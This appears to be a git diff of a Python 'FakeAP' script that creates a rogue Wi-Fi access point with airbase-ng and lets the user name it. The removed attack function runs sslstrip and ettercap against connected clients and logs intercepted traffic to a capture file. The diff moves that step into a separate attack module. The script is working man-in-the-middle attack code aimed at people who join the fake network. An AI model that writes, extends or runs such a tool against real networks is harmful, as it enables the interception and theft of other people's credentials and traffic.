@@ -6,6 +6,7 @@ os.system("clear")
 # Ask for Interfaces
 interfaceAP = input("\nInterface for AP? --> ")
 interfaceInet = input("\nInterface connected to Internet? --> ")
+nameAP = input("\nName for the Acces Point? --> ")
 
 def cleanTroubles(): # Kill conflictive proceses!
   os.system("clear")
@@ -39,7 +40,7 @@ def startAP(): # Start AP!
   print("Starting AP...")
   time.sleep(1)
   os.system("clear")
-  os.system("xterm -e airbase-ng -c6 -P -C20 -y -v mon0 &") # Start AP
+  os.system("xterm -e airbase-ng -e " + nameAP + " -v mon0 &") # Start AP
   os.system("clear")
   print("Ok, done!")
   time.sleep(1)
@@ -89,40 +90,7 @@ def dnsStart(): # Start DNS server!
 
 def attack(): # Launch Attack!!!
   os.system("clear")
-  print("Everything is done, FakeAP is prepeared!")
-  proceed = input("\nAttack?(y/n) -->")
-  if proceed == "y":
-    os.system("clear")
-    print("Launching Sslstrip...")
-    time.sleep(0.7)
-    os.system("clear")
-    print("\n\n\n\t\t\t\t3")
-    time.sleep(1)
-    os.system("clear")
-    print("\n\n\n\t\t\t\t2")
-    time.sleep(1)
-    os.system("clear")
-    print("\n\n\n\t\t\t\t1")
-    time.sleep(1)
-    os.system("clear")
-    print("Launched!  (Result on captures/capture.txt)")
-    os.system("xterm -e sslstrip -a -w captures/capture.txt &") # Launch Sslstrip!
-    os.system("xterm -e ettercap -p -u -T -q -i at0 &") # Launch Ettercap
-  elif proceed == "n":
-    os.system("clear")
-    print("Aborted!")
-    time.sleep(1)
-    os.system("clear")
-    print("Back to menu...")
-    time.sleep(1)
-    os.system("clear")
-    os.system("python main.py")
-  else:
-    os.system("clear")
-    print("Yes(y) or No(n).")
-    time.sleep(1)
-    os.system("clear")
-    attack()
+  os.system("python creator/attacks/main.py")
 
 def noroot(): # noRoot
   os.system("clear")
@@ -133,7 +101,7 @@ def noroot(): # noRoot
 def main(): # Main Window
   os.system("clear")
   print("We are going to create the AP.")
-  accept = input("Continue?(y/n) --> ")
+  accept = input("\nContinue?(y/n) --> ")
   if accept == "y":
     cleanTroubles()
     interfaceConf()
